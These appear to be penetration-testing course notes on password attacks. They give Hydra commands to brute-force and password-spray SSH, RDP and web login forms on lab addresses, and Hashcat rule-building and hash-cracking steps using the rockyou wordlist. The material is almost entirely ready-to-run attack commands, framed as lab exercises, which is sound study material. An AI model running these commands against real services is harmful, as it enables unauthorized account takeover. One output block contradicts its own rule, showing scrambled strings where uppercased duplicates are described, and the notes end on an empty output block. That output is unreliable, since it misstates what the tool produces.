## 15.1. Attacking Network Services Logins
### SSH & RDP
#### Brute Force attack w/ Hydra against SSH (on port 2222)
```Shell
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
#### Password spraying RDP w/ Hydra
```Shell
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
### HTTP POST Login Form
#### Hydra command to brute force HTTP POST login form
```Shell
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
#### Hydra command to brute force HTTP GET form
```Shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f $ip -s 80 http-get
```
## 15.2. Password Cracking Fundamentals
### Mutating Wordlists
- Assume a password requires an upper case letter, a special character, and a numerical value.
- [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- We can use the `$` function to append a character or `^` to prepend a character.
#### Move 10 words into a demo file
```Shell
head /usr/share/wordlists/rockyou.txt > demo.txt
```
#### Find any lines that start w/ "1" and delete them
```Shell
sed -i '/^1/d' demo.txt
```
#### Append "1" to the end of all words in the demo list
```Shell
echo \$1 > demo.rule
```
#### Display mutated hashes w/ Hashcat
```Shell
hashcat -r demo.rule --stdout demo.txt
```
#### Create a rule that appends a "1" to each line and capitalizes the first letter of each line
```Shell
echo \$1 c > demo1.rule
```
#### Create a rule that alternates between appending a "1" and capitalizing the first letter
```
vim demo2.rule

$1
c
```
#### Examine list w/ hashcat
```Shell
hashcat -r demo2.rule --stdout demo.txt
```
Output:
```
password1
Password
iloveyou1
Iloveyou
princess1
Princess
rockyou1
Rockyou
abc1231
Abc123
```
#### Add a special character w/ `$!` to the end of the first rule
```Shell
vim demo1.rule

$1 c $!
```
#### Add a special character w/ `$!` to the beginning of the second rule
```Shell
vim demo2.rule

$! $1 c
```
#### Show wordlist after hashcat mutates them
```Shell
hashcat -r demo2.rule --stdout demo.txt
```
Output:
```
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```
#### Make a rule that appends "1" to the first line, capitalizes the first letter, and appends a special character to the end; then one that adds a "2" to the end, capitalizes the first letter, and appends a special character to the end; and then a rule that appends "123" to the end of each line, capitalizes the first letter, and appends a special character
```vim demo3.rule
$1 c $!
$2 c $!
$1 $2 $3 c $!
```
#### Crack the password w/ hashcat
```Shell
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```
### Lab:
#### Make rule to add "1@3$5"
```Shell
vim lab1.rule

$1 $@ $3 $$ $5
```
#### Test to ensure it's correct
```Shell
hashcat -r lab1.rule --stdout demo.txt
```
Output:
```
password1@3$5
iloveyou1@3$5
princess1@3$5
rockyou1@3$5
abc1231@3$5
```
#### Use w/ hashcat to crack hash
```Shell
hashcat -m 0 hash1.txt /usr/share/wordlists/rockyou.txt -r lab1.rule --force
```
Output:
```
056df33e47082c77148dba529212d50a:courtney1@3$5
```
#### Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt
```Shell
echo ud > lab2.rule
```
#### Confirm wordlist w/ Hashcat
```Shell
hashcat -r lab2.rule --stdout demo.txt
```
Output:
```
PASSWORDymwwu
ILOVEYOUy~o~g}w
PRINCESSrko{owS
ROCKYOURockyw
ABC123ABC123
```
#### Run w/ rockyou.txt and crack the hash w/ hashcat
```Shell
hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt -r lab2.rule --force
```
Output:
```
